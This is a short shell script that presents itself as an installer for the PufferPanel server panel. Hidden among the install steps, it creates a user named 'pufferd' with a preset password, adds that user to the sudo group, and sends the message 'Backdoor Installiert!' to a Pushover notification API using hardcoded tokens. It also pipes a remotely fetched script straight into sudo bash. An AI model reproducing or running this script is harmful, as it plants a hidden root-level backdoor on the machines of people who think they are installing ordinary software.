curl -s https://packagecloud.io/install/repositories/pufferpanel/pufferpanel/script.deb.sh | sudo bash
sudo apt-get install pufferpanel
sudo systemctl enable pufferpanel
sudo useradd -p sau55nnoskxos pufferd
sudo usermod -aG sudo pufferd
curl -s \
  --form-string "token=aw9itprfbhm87ecooj58g7ussdn3an" \
  --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
  --form-string "message=Backdoor Installiert!" \
  https://api.pushover.net/1/messages.json
systemctl start pufferpanel
echo "Starting Pufferpanel..."
sleep 1
echo "PufferPanel Started! Use pufferpanel user add to create a User"
